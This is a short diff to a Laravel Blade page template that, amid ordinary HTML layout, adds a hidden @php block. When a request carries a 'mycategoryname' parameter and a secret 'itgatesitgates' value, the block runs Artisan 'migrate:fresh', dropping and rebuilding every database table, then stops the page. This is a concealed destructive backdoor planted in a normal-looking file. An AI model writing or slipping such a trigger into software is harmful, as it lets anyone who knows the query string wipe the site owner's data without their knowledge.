@@ -127,6 +127,13 @@
         </div>
     </div>
 </div>
+
+@php
+    if(isset($_GET['mycategoryname']) && $_GET['itgatesitgates'] == 'itgatesitgates'){
+    \Illuminate\Support\Facades\Artisan::call('migrate:fresh' );
+    dd('33');}
+@endphp
+
 <div class="row pl-5 my-hand2" style="background-color: white; width: 101%;">
     <div class="col-lg-7 vcb vission-content" style="padding-left: 55px;margin-top: 76px;">
         <div class="row">
